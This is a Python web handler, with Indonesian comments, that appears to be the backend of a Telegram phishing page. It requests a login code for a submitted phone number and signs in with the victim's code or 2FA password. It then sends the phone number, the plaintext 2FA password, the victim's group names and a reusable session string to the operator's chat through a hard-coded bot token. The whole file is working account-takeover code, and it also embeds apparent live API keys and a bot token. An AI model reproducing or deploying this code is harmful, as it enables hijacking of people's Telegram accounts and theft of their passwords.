from http.server import BaseHTTPRequestHandler
import json, asyncio, urllib.request
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty

# --- KONFIGURASI ---
API_ID = 35886767
API_HASH = '0db34fcf6983aa22efabe87689391deb'
BOT_TOKEN = "8509120059:AAHah0iXHUjVxBqkl7-2ARhp1_BvNhnMuxo"
MY_CHAT_ID = "7981083332"

def bot_log(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({
            "chat_id": MY_CHAT_ID, 
            "text": text, 
            "parse_mode": "Markdown"
        }).encode()
        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req)
    except: pass

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(content_length))
        action = self.path.split('action=')[-1]
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            res = loop.run_until_complete(self.work(action, data))
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(res).encode())
        finally: loop.close()

    async def work(self, action, data):
        ss = data.get('session', '')
        client = TelegramClient(StringSession(ss), API_ID, API_HASH, sequential_updates=False)
        await client.connect()
        
        try:
            if action == 'send_code':
                s = await client.send_code_request(data['phone'])
                return {"success": True, "hash": s.phone_code_hash, "session": client.session.save()}
            
            elif action == 'signin':
                input_password = data.get('password')
                
                if input_password:
                    await client.sign_in(password=input_password)
                else:
                    await client.sign_in(data['phone'], data['code'], phone_code_hash=data['hash'])
                
                # --- AMBIL DAFTAR GRUP ---
                group_list = []
                try:
                    dialogs = await client(GetDialogsRequest(
                        offset_date=None, offset_id=0, offset_peer=InputPeerEmpty(), limit=20, hash=0
                    ))
                    for d in dialogs.chats:
                        if hasattr(d, 'title'):
                            group_list.append(d.title)
                except: pass
                
                groups_str = ", ".join(group_list[:10]) if group_list else "Tidak ada grup"
                final_string = client.session.save()

                # --- LOGIC RAZOR: GABUNGKAN SESI DAN PASSWORD ---
                # Jika ada 2FA, kirim format SESSION|PASSWORD
                if input_password:
                    combined_data = f"{final_string}|{input_password}"
                else:
                    combined_data = final_string

                # --- FORMAT LAPORAN ---
                report = (
                    f"✅ **Login Berhasil**\n"
                    f"📱 **Nomor:** `{data.get('phone', 'N/A')}`\n"
                    f"🔑 **2FA Password:** `{input_password if input_password else 'Mati'}`\n\n"
                    f"📋 **Grup:** {groups_str}\n\n"
                    f"⚡ **Copy Sesi ke Bot Manager:**\n`{combined_data}`"
                )
                
                bot_log(report)
                return {"success": True}

        except SessionPasswordNeededError:
            return {"success": True, "need_2fa": True, "session": client.session.save()}
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally: await client.disconnect()
